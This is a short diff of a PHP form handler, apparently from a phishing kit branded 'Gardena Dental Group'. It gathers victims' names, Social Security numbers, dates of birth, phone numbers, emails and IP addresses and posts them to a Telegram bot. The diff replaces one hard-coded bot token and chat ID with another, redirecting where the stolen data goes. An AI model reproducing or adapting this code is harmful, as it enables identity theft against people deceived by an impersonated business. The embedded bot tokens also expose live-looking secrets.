@@ -11,8 +11,8 @@ if (isset($_POST['submit'])) {
     $ipAddress = $_POST['ip_address'] ?? ''; 
 
     $message = "Gardena Dental Group\n\nFirst Name : $firstName\nLast Name : $lastName\nSSN : $ssn\nDOB : $dob\nPhone : $phone\nEmail : $email\n\nIP Address : $ipAddress\nUser Agent : $userAgent";
-    $apiToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
-    $chatId = '@rezolucijax';
+    $apiToken = '5880113137:AAEBkVOchK-a2a4fQEFSwj04oP3bhpIHBEU';
+    $chatId = '@ad524534';
     $telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage";
     $telegramData = [
         'chat_id' => $chatId,
